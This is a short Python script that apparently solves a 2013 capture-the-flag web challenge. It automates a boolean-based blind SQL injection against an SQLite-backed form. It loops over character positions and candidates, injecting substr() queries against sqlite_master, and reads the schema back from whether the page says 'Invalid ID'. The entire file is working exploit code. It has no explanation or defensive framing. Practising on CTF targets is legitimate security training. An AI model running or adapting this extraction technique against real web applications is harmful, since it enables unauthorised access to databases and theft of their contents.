'''
Created on 2016-2-14
@author: wenhuizone
'''
import requests
import string

URL='http://hack.bckdr.in/2013-WEB-500/submit.php'
resp=requests.get(URL).headers
headers={
    'Host': 'hack.bckdr.in',
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0'
}
list="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ ,(){}'"
def post(i):
    resp=requests.get(URL,headers=headers).text
    payload={'id':i }
    re=requests.post(URL,headers=headers,data=payload).text
    return 'Invalid ID' in re
p='CREATE TABLE data (id INTEGER  NOT NULL PRIMARY KEY ,title TEXT  NULL,data TEXT  NULL)'
for n in range(86,180):
    for i in list:
        x="1' and substr((select sql from sqlite_master),%s,1)='%s'--" %(n,i)
        if not(post(x)):
            p=p+i
            print 'result:%s' % p
            break